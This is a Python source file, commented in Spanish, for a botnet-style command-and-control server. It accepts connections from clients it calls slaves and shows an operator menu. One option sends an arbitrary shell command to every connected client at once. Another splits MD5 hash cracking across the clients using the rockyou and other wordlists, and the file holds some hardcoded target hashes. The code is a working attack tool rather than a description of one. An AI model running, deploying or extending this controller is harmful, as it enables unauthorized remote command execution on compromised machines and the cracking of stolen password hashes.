import socket
from threading import Thread, Event
from typing import List
from time import perf_counter
import UI
import FileReader003_Bytes

SERVER_HOST = "192.168.1.46"#"127.0.0.1" # can also be the hostname
SERVER_PORT = 6667

HEADERSIZE = 16

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(5)


client_sockets:List[socket.socket] = list()
print(f"Waiting for connections {SERVER_HOST}:{SERVER_PORT}")


def mostrar_elementos(array:List[socket.socket]):
    i = 0
    if array.__len__()==1:
        print(f"[{i}] - {array[i].getpeername()}")
        return

    while i < array.__len__()-1:
        for i in range(i, min(i + 5, array.__len__())):
            print(f"[{i}] - {array[i].getpeername()}")               
        respuesta = input("¿Desea mostrar los siguientes 5 elementos? (Si(s)/No(n)/Todos(a)): ")               
        if respuesta.lower() == 's':
            i+=1
            continue
        elif respuesta.lower() == 'a':
            i+=1
            for i in range(i, array.__len__()):
                print(array[i])
        break
def acceptor():
    global client_sockets
    global server_socket
    while True:
        client_socket, client_address = server_socket.accept() # nueva conexión     
        client_sockets.append(client_socket)
        print(f"[+] {client_address} connected.") 
def messageSender(info:str,client_socket:socket.socket):# Send message to server
    message = (info).encode("utf-8") # el tamaño del mensaje + el mensaje  
    message_header = f"{len(message):<{HEADERSIZE}}".encode("utf-8")
    client_socket.send(message_header + message)
def listen_for_messages(client_socket:socket.socket):
    header = client_socket.recv(HEADERSIZE).decode()    
    message = client_socket.recv(int(header.strip())).decode()
    print("MSG_RCV: ",message)
    return message
def byte_liste_for_message(client_socket:socket.socket):
    header = client_socket.recv(HEADERSIZE).decode()
    message = client_socket.recv(int(header.strip()))
    print("MSG:",message)
    return message
p = Thread(target=acceptor,daemon=True)
p.start()



    


def bruteForceHash(hash:str): # Cosas a mandar a cada cliente opcionHash,#from-to-bytes (int-int), wordlist(rockyou o no) # receive1o0
    global client_sockets
    wordlist = {"name":"realhuman_phill.txt","size":716441107}
    #wordlist = {"name":"rockyou.txt","size":139921497}
    
    pre_reader = perf_counter() # start time
    fileReader = FileReader003_Bytes.FileReader(wordlist=wordlist["name"],number_of_chunks=len(client_sockets),file_size=wordlist["size"])
    post_reader = perf_counter()
    print("File Reader Creator Time:",post_reader-pre_reader)
    
    
    
    conThreads:dict[socket.socket,Thread] = {}
    print("HASH: ",hash)
    done.clear()
    for s in client_sockets:
        messageSender("2"+hash,s)           # done opcionHash
        conThreads[s]= Thread(target=HashDictManager, args=(s,fileReader))
        conThreads[s].start()
    post_threadCreate = perf_counter()
    print("Socket and thread creation",post_threadCreate-post_reader,"Total Time",post_threadCreate-pre_reader)

    for c in conThreads.values():
        c.join()
    post_threadExecution = perf_counter()
    print("Thread duration",post_threadExecution-post_threadCreate,"Total Time",post_threadExecution-pre_reader)
    
    
    for s in client_sockets:
        messageSender("STOP",client_socket=s)

    if not done.is_set():
        print("NO SE HA ENCONTRADO LA CONTRASEÑA DE :",hash, "En La Wordlist: ",wordlist)

    
    del fileReader
    
      
#manager de 1 cliente con opcion+Hash ya enviada queda #from-to-bytes (int-int), wordlist(rockyou o no) # receive1o0
def HashDictManager(socket:socket.socket,fileReader:FileReader003_Bytes.FileReader):
    nextChunk = None # lines to send
    #fileReader.stats() # print stats
    startHashThread = perf_counter()
    while not done.is_set() and fileReader.hasFree(): # si nadie encuentra y quedan libres
        start_while = perf_counter()
        nextChunk=fileReader.assign_chunk(socket)     # get lines
        #fileReader.stats() # print stats
        messageSender(info=f"{nextChunk.first}-{nextChunk.last}",client_socket=socket)
        messageSender(info=fileReader.wordlist,client_socket=socket)
        resp = byte_liste_for_message(client_socket=socket)
        print(resp)
        if chr(resp[0])=="1":
            print("////////CONTRASEÑA ENCONTRADA:\nPASSWORD: ",resp[1:])
            done.set()
            break
            
        elif chr(resp[0])==b"0":
            nextChunk.estado = FileReader003_Bytes.Estado.DONE
        print("While Time = ",perf_counter()-start_while)
    print("Ending Thread Time: ",perf_counter()-startHashThread)
    #fileReader.stats() # print stats

salir = False
opcion = 0
done = Event()
while not salir:
    
    UI.mostrarMenu()
    opcion = UI.pedirNumeroEntero(0,4)
    print("Numero de esclavos 👴:",len(client_sockets))
    if opcion == 1:
        print ("1. Mandar Comandos masivos")
        cmdReader = input("CMD = ")
        for client_socket in client_sockets: # posibilidad de paralelismo dividiendo la lista entre varias threads
            messageSender("1"+cmdReader,client_socket=client_socket)
            print(listen_for_messages(client_socket=client_socket))
    elif opcion == 2:
        print ("2. Crack Contraseñas Distribuido")
        opcion= input("Hardcoded(f)/Hash(h)/Volver(v): \n").lower()
        while opcion not in ["f","h","v"]:
            print("invalid")
            opcion= input("Hardcoded(f)/Hash(h)/Volver(v): \n").lower()
        if opcion == "v": continue
        elif opcion == "f":
            bruteForceHash("de5f3f4aa5bcdca7be20f69b79cd9a65")#b'\xb4SWATCH' #"8bb0b4d4905d4c6546d1ccf807344d12")# '  kaitlynn4' from ending rockyou #"110cea74cf52e41ead691dccdf75f27b") # md5 september hash
        elif opcion == "h":
            seguro= False
            while not seguro:
                hash = input("Mete tu hash")
                seguro = True if input("este es tu hash: "+hash+" (S/N)").lower() == "s" else False
            bruteForceHash(hash=hash)
    elif opcion == 3:
        print("3. Opcion Mostrar Info de la Bot")
        mostrar_elementos(array=client_sockets)      
    elif opcion == 4:
        print ("4. Refresh")
    elif opcion == 0:
        for i in client_sockets:
            messageSender("0",i)
        salir = True
    else:
        print ("Introduce un numero entre 0 y 4")
